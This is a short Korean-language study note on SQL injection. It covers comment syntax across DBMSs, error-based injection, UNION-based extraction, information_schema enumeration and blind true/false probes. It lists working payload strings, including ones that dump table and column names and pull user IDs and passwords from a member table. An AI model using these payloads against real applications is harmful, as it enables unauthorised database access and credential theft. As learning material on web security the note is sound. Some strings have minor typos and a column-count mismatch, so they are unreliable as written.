웹 애플리케이션이 데이터베이스에 날리는 SQL을 개발자가 의도하지 않은 형태로 조작 · 공격

---

**주석 값** 
- 'or 1=1-- 
- -- : mssql, oracle에서 주석 처리
- '#' : mysql에서 사용하는 주석 처리
- '-- -' : 전부 다 됨

---


**error base sql injection**
응답에러메시지를통해정보를획득하여공격하는sql공격기법
- ``having 1=1 --`
- ``group by ~--`



---


**union sql injection**
 UNION 구문을 사용해서 테이블 2개의 내용을 동시에 출력이 가능한데 이를 통해 공격자가 알고있는 DB의 테이블의 데이터를 조회해서 하는 공격
 UNION 연결하는 칼럼 타입, 수가 같아야함
- `UNION SELECT 1,2,3,4,5,6,7 FROM member--
- `UNION SELECT 1,2,3,null,null,null,null FROM member--
- `UNION SELECT 1,2,3,m_id,m_name,NULL,NULL FROM member--


---


**information_schema를 사용한 DB 정보 획득**

- MYSQL, MSSQL의 경우 information_schema 
DB에 전체 DB 정보를 저장하고 있음
- information_schema.colims 테이블
	- 'UNION SELECT 1,2,3,table_name,column_name,NULL,NULL from information_schema.columns--

	- ![](Images/Pasted%20image%2020260729162837.png)
	- 'UNION SELECT 1,2,3,column_name,NULL,NULL,NULL from information_schema.columns where table_name = 'member'--
	
	-![](Images/Pasted%20image%2020260729162744.png)
	- 'UNION SELECT 1,2,3,m_id,m_pwd,m_name,NULL,NULL from 'member'--
	![](Images/Pasted%20image%2020260729163310.png)
	
	
	

---

**BLIND SQL INJECTION**

- 쿼리 결과 (참, 거짓)에 따라 정보를 획득하여 공격하는 기법

```

attacker' and 1=1-- // 참 구문
attacker' and 1=2-- // 거짓 구문

```